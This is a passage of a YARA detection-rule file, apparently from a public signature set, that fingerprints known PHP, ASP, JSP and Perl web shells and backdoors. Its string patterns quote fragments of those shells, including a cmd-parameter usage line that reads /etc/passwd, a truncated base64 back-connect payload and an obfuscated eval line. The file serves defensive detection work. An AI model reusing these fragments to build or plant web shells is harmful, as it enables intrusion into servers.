		$s0 = "W3D Shell"
		$s1 = "By: Warpboy"
		$s2 = "No Query Executed"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Cgi_2
{
	meta:
		description = "Semi-Auto-generated  - file WebShell.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "b768bb72-64e8-545a-9123-3d5889b58a82"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3976-L3987"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "bc486c2e00b5fc3e4e783557a2441e6f"
		logic_hash = "8908ced96284de6b6d5ae693ba54c49a6333bbe5780d951cbacc91b4dde027df"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "WebShell.cgi"
		$s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else"

	condition:
		all of them
}

rule SIGNATURE_BASE_Winx_Shell_Html_2
{
	meta:
		description = "Semi-Auto-generated  - file WinX Shell.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fe02d995-4375-5ce9-aabe-fae5d29278d3"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L3988-L4000"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "17ab5086aef89d4951fe9b7c7a561dda"
		logic_hash = "4248f807d66990946523ba7b92d795c2c40429182389d9bf3f4a972e246b50c6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "WinX Shell"
		$s1 = "Created by greenwood from n57"
		$s2 = "<td><font color=\\\"#990000\\\">Win Dir:</font></td>"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Dx_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Dx.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "67d0bccb-d39a-5e30-bdc0-801525ebddd7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4001-L4013"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9cfe372d49fe8bf2fac8e1c534153d9b"
		logic_hash = "ab43ddcf317eb4db890ca9750dc6bbc19b06b806339a67c82216df02bc2e8446"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
		$s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util"
		$s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Csh_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file csh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "da691516-d6c9-5c4b-85c3-f1cd7fc96ae7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4014-L4027"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "194a9d3f3eac8bc56d9a7c55c016af96"
		logic_hash = "2a74e06a9fd59d7a577041b49403738904239fb011f9bfe2fb665165991b9c98"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ".::[c0derz]::. web-shell"
		$s1 = "http://c0derz.org.ua"
		$s2 = "vint21h@c0derz.org.ua"
		$s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Phpinj_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file pHpINJ.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7bf54ef4-a3d8-51c6-8db7-bf8947e992ed"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4028-L4040"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d7a4b0df45d34888d5a09f745e85733f"
		logic_hash = "5d39fd31cdaae7765267ce8a35a2fdcf86e7f0de40d4f303fb0f219c0fc04e40"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "News Remote PHP Shell Injection"
		$s3 = "Php Shell <br />" fullword
		$s4 = "<input type = \"text\" name = \"url\" value = \""

	condition:
		2 of them
}

rule SIGNATURE_BASE_Sig_2008_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file 2008.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "bfa3caa9-70a5-536b-a887-58427eee43df"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4041-L4054"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3e4ba470d4c38765e4b16ed930facf2c"
		logic_hash = "a437dc3dc836e93c7a691f7a000c4a4ae574ba95b3a216394ba42538beb9c0f7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Codz by angel(4ngel)"
		$s1 = "Web: http://www.4ngel.net"
		$s2 = "$admin['cookielife'] = 86400;"
		$s3 = "$errmsg = 'The file you want Downloadable was nonexistent';"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Rem_View_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Rem View.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "6137434c-89e9-537b-9b26-b56178022b76"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4068-L4080"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "29420106d9a81553ef0d1ca72b9934d9"
		logic_hash = "bcd5c86e793748ffe0ce4415ee68101e8183e1f97477b49843938d254f08695a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\""
		$s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
		$s4 = "Welcome to phpRemoteView (RemView)"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Java_Shell_Js_2
{
	meta:
		description = "Semi-Auto-generated  - file Java Shell.js.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eff52c3a-fc3a-5e80-8da9-786168159ebc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4081-L4093"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "36403bc776eb12e8b7cc0eb47c8aac83"
		logic_hash = "f312298ac30ab57b21222a529b1566b9a66909806e4bc88120ac3992cfd3c6fb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "PySystemState.initialize(System.getProperties(), null, argv);" fullword
		$s3 = "public class JythonShell extends JPanel implements Runnable {" fullword
		$s4 = "public static int DEFAULT_SCROLLBACK = 100"

	condition:
		2 of them
}

rule SIGNATURE_BASE_STNC_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file STNC.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "8a7167f6-fa62-574f-a37c-3ceadc7f92ec"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4094-L4107"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "2e56cfd5b5014cbbf1c1e3f082531815"
		logic_hash = "b4118dc45ac109bde1cafda24cc103370db57c1993690f450cff828c1633af3c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "drmist.ru" fullword
		$s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80"
		$s2 = "STNC WebShell"
		$s3 = "http://www.security-teams.net/index.php?showtopic="

	condition:
		1 of them
}

rule SIGNATURE_BASE_Azrailphp_V1_0_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file aZRaiLPhp v1.0.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "60152b96-e8d3-5b06-a855-fb64a490742b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4108-L4120"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "26b2d3943395682e36da06ed493a3715"
		logic_hash = "4385f294e59b644fe86d8380db4f7926924eb744ad80735b78ef778d2f7e8ae0"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "azrailphp"
		$s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>"
		$s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Moroccan_Spamers_Ma_Edition_By_Ghost_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "721d6e9f-a237-5462-a8d3-f838d7fda420"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4121-L4133"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d1b7b311a7ffffebf51437d7cd97dc65"
		logic_hash = "e755e4ea467861e5217d532b161bf4c582ff71aa1e4720dfa4b75d6e8d7629d8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = ";$sd98=\"john.barker446@gmail.com\""
		$s1 = "print \"Sending mail to $to....... \";"
		$s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Cmdasp_Asp_2
{
	meta:
		description = "Semi-Auto-generated  - file CmdAsp.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "79e0ba85-ed4b-5909-a2fd-9b4125598078"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4147-L4160"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "64f24f09ec6efaa904e2492dffc518b9"
		logic_hash = "95dc25ecd47b43edbd7e7e36966377aa09da769aff2bc1c33a7df87989611bfa"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "CmdAsp.asp"
		$s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
		$s2 = "-- Use a poor man's pipe ... a temp file --"
		$s3 = "maceo @ dogmile.com"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Simple_Backdoor_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file simple-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "5607f501-a750-59be-9595-5ac71ea6f74b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4161-L4173"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f091d1b9274c881f8e41b2f96e6b9936"
		logic_hash = "e2e98580b59727313de298fab0009704f621b1b6556220d5065118d960f7a068"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
		$s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
		$s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Mysql_Shell_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file mysql_shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e517984b-575c-5ead-a438-9767d2c74099"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4174-L4186"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d42aec2891214cace99b3eb9f3e21a63"
		logic_hash = "dbd825e1056c41efaf80c0495ba7b6cf1c88403b997ea7ac1378512a19f7ed8a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SooMin Kim"
		$s1 = "smkim@popeye.snu.ac.kr"
		$s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Dive_Shell_1_0___Emperor_Hacking_Team_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file Dive Shell 1.0 - Emperor Hacking Team.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "d75294a4-a0a7-5c74-bb7a-766db477633c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4187-L4200"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1b5102bdc41a7bc439eea8f0010310a5"
		logic_hash = "bd51b625359799178ad3c8e02ba5bb5fca89e6e14769b86dd35c2b8a1049599f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "Emperor Hacking TEAM"
		$s1 = "Simshell" fullword
		$s2 = "ereg('^[[:blank:]]*cd[[:blank:]]"
		$s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Asmodeus_V0_1_Pl_2
{
	meta:
		description = "Semi-Auto-generated  - file Asmodeus v0.1.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cfd082a8-56fa-54bc-a683-c0052f78e12e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4201-L4214"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0978b672db0657103c79505df69cb4bb"
		logic_hash = "be0130c9d2a5d29e6ef8749b0058c96c2ca1ecb9823fd14a8a2c82978cf3d104"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "[url=http://www.governmentsecurity.org"
		$s1 = "perl asmodeus.pl client 6666 127.0.0.1"
		$s2 = "print \"Asmodeus Perl Remote Shell"
		$s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Backup_Php_Often_With_C99Shell_2
{
	meta:
		description = "Semi-Auto-generated  - file backup.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4215-L4227"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "aeee3bae226ad57baf4be8745c3f6094"
		logic_hash = "e27d00ebfbac2565568b9a97552a331db91b4e9aa318febb048937f5c3a1a1ba"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#phpMyAdmin MySQL-Dump" fullword
		$s2 = ";db_connect();header('Content-Type: application/octetstr"
		$s4 = "$data .= \"#Database: $database" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Reader_Asp_2
{
	meta:
		description = "Semi-Auto-generated  - file Reader.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "70094d24-fa3a-503c-b9b6-294a883fc52c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4228-L4240"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ad1a362e0a24c4475335e3e891a01731"
		logic_hash = "ec0dc3b050d84e852e0c18bd00961f109d3506fa7f2e8656448bd5edd28d9305"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "Mehdi & HolyDemon"
		$s2 = "www.infilak."
		$s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Phpshell17_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file phpshell17.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ea1f657c-2023-50bb-a2ee-33c53ee8fb5e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4241-L4253"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9a928d741d12ea08a624ee9ed5a8c39d"
		logic_hash = "a9306747a5c9756f393c61562ed4a601c75c3a9491ad19a7b7dbae1fbd505e9a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword
		$s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></"
		$s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Myshell_Php_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file myshell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4254-L4266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "62783d1db52d05b1b6ae2403a7044490"
		logic_hash = "dd7b0fa637a8317986de0c2312b4b552f1110fb5a64590a9a21c854e5985fbb6"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory."
		$s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color"
		$s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Jspshall_Jsp_2
{
	meta:
		description = "Semi-Auto-generated  - file jspshall.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4bccad33-d26e-52c2-b7f8-802f2c8f3889"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4281-L4293"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "efe0f6edaa512c4e1fdca4eeda77b7ee"
		logic_hash = "94c458d3f38ba21348b0202e2b81bbbc3859e97d64f101a9ea7ec6f036e38bc5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "kj021320"
		$s1 = "case 'T':systemTools(out);break;"
		$s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file webshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4294-L4305"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e425241b928e992bde43dd65180a4894"
		logic_hash = "7b0f4f4afde7dcb44c9d877a72c961f3666278ce28a24ae8068cfbc32639e307"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s2 = "<die(\"Couldn't Read directory, Blocked!!!\");"
		$s3 = "PHP Web Shell"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rootshell_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file rootshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "aec6621e-f23a-5f9f-91f1-d2f1b1ab58d0"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4306-L4319"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "265f3319075536030e59ba2f9ef3eac6"
		logic_hash = "f836dd1825dc84212d32a034c0dde45d60ccd1eb667018abb60d671b61192666"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "shells.dl.am"
		$s1 = "This server has been infected by $owner"
		$s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>"
		$s4 = "Could not write to file! (Maybe you didn't enter any text?)"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Connectback2_Pl_2
{
	meta:
		description = "Semi-Auto-generated  - file connectback2.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "4ddebc62-17d2-577e-84bd-207367078327"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4320-L4332"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "473b7d226ea6ebaacc24504bd740822e"
		logic_hash = "7316c93f12dbbf6d0235601d8be88c199e37955507925222d00041d0ceaf01c7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   "
		$s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel"
		$s2 = "ConnectBack Backdoor"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Defacekeeper_0_2_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file DefaceKeeper_0.2.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "671323e2-42cb-5ce0-9839-5d01c446471c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4333-L4345"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "713c54c3da3031bc614a8a55dccd7e7f"
		logic_hash = "0ee3fed3441e9561867508e324d7a6b1808a8923513bf1c9b82f8238224c994c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
		$s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9"
		$s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Shells_PHP_Wso_2
{
	meta:
		description = "Semi-Auto-generated  - file wso.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "fdce6094-a88e-5da6-aeb0-bc97b15bf397"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4346-L4357"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "33e2891c13b78328da9062fbfcf898b6"
		logic_hash = "31ef69228b66b30300006f63b1e4d6e92c2512caca4bd915d418b48564b39c47"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi"
		$s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Backdoor1_Php_2
{
	meta:
		description = "Semi-Auto-generated  - file backdoor1.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "89f44a1c-8a42-58f6-9308-371f4e652bff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4358-L4370"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e1adda1f866367f52de001257b4d6c98"
		logic_hash = "7c8840dc91c16b9fa19fee16e0159a7f13db23c96596e18da0cdab07931ce35b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "echo \"[DIR] <A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".realpath($rep.\".."
		$s2 = "class backdoor {"
		$s4 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?copy=1\\\">Copier un fichier</a> <"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Elmaliseker_Asp_2
{
	meta:
		description = "Semi-Auto-generated  - file elmaliseker.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "7ecf3d5c-be91-579e-905b-5f2ad03a0e42"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L4371-L4384"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b32d1730d23a660fd6aa8e60c3dc549f"
		logic_hash = "969f0f12449375a9ebbb8a68fd4b3db395927416d5cceccdb7f2c64310430880"
		score = 75
		quality = 85
		tags = ""

	strings:
